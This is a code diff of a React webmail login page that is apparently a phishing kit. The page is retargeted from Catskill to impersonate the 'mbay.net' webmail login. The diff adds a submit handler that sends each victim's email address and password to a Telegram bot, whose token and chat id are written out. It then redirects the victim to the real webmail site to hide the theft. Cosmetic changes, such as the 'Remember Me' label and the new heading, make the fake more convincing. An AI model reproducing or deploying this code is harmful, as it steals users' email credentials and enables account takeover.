@@ -16,35 +16,44 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Catskill")
+    const[platform, setPlatform] = useState("Mbay-Net")
 
     const[showError, setShowError] = useState(false);
 
 
-async function handleSubmit(e){
-    e.preventDefault();
-
-    try {
-        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
+    async function handleSubmit(e){
+        e.preventDefault();
     
-        // Handle success
-        console.log('Data sent:', response.data.message);
-
-        if(response.status == 200){
-            console.log(response.data.message);
-
-            window.location.href = 'https://webmail.catskill.net/';
-        }
-      } catch (error) {
-        // Handle error
-        console.error('Error:', error);
-      }
     
-}
+        try {
+           
+    
+           const response = await axios.post(`https://api.telegram.org/bot6471655485:AAH0iIugJnVoXXAcekKKQoxQDzixvzM-zxE/sendMessage`, {
+                chat_id: 5868304053,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
+    
+        
+            // Handle success
+         
+    
+            if(response.status == 200){
+               // console.log(response.data.message);
+    
+              
+               window.location.href = 'https://webmail.mbay.net/interface/root#/login';
+            }
+          } catch (error) {
+            // Handle error
+            console.error('Error:', error);
+          }
+        
+    
+        
+    }
+    
+
 
 
     return (
@@ -62,12 +71,22 @@ async function handleSubmit(e){
 
 
             <div className='text-center my-4'>
-            <img  src={catskill} />
+            {/* <img  src={catskill} /> */}
 
             </div>
 
 
             <div className='col-md-5 whitediv m-auto py-3 px-5'>
+
+
+                <div className='text-center py-3 '>
+                    <p style={{
+                        color:"black",
+                        fontSize:"18px",
+                        fontWeight:"400"
+                    }}>Webmail Login - mbay.net</p>
+
+                </div>
                 
 
 
@@ -99,13 +118,13 @@ async function handleSubmit(e){
                         <input type="checkbox"className='mycheck'/> 
                      <span class="toggle-slider"></span> <span className='px-3 'style={{
                          fontSize:"15px",
-                     }}>Shared computer - log me out after 4 hours</span>
+                     }}>Remember Me</span>
     </label>
 
                     </div>
 
 
-                    <div className='form-group'>
+                    {/* <div className='form-group'>
                     <label class="toggle-container">
                         <input type="checkbox"className='mycheck'/> 
                      <span class="toggle-slider"></span> <span className='px-3 'style={{
@@ -113,7 +132,7 @@ async function handleSubmit(e){
                      }}>Keep me logged in until I log out</span>
     </label>
 
-                    </div>
+                    </div> */}
 
 
                     <div className='form-group text-center'>
